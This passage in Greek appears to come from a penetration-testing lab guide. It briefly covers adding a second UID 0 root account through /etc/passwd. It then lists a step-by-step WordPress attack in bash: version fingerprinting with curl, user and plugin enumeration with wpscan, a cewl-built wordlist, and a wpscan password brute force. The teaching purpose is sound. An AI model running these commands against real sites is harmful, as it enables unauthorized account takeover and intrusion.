πραγματικό hash και **UID 0** — άρα έναν δεύτερο λογαριασμό root. Το hash πρέπει να είναι
πραγματικό γιατί όταν το πεδίο 2 δεν είναι `x`, ο μηχανισμός πιστοποίησης ελέγχει **αυτό** το
αρχείο και όχι το `/etc/shadow`.

### 6.10 Η πλήρης ροή μιας επίθεσης σε WordPress

```bash
# 1. Αναγνώριση έκδοσης
curl -sI http://TARGET/ | grep -iE 'generator|powered'
curl -s http://TARGET/readme.html | grep -oE '[0-9]+\.[0-9]+\.?[0-9]*' | head -1

# 2. Χρήστες
wpscan --url http://TARGET/ -e u

# 3. Πρόσθετα και ευπάθειες
wpscan --url http://TARGET/ -e ap --plugins-detection aggressive

# 4. Στοχευμένο λεξικό από το ίδιο το site
cewl -w words.txt -d 2 -m 5 http://TARGET/
sort -u -o words.txt words.txt

# 5. Επίθεση
wpscan --url http://TARGET/ -U admin,john -P words.txt
```

**Η σειρά έχει σημασία.** Πρώτα έκδοση (για CVEs), μετά χρήστες (για το oracle), μετά πρόσθετα
(για ευπάθειες), και **τελευταία** η επίθεση με λεξικό — γιατί το brute force είναι το πιο
θορυβώδες και το πιο αργό. Στο Μηχάνημα 4 το λεξικό φτιάχνεται με `cewl` **από το ίδιο το
site**, γιατί οι κωδικοί είναι θεματικοί και το `rockyou` δεν τους βρίσκει.
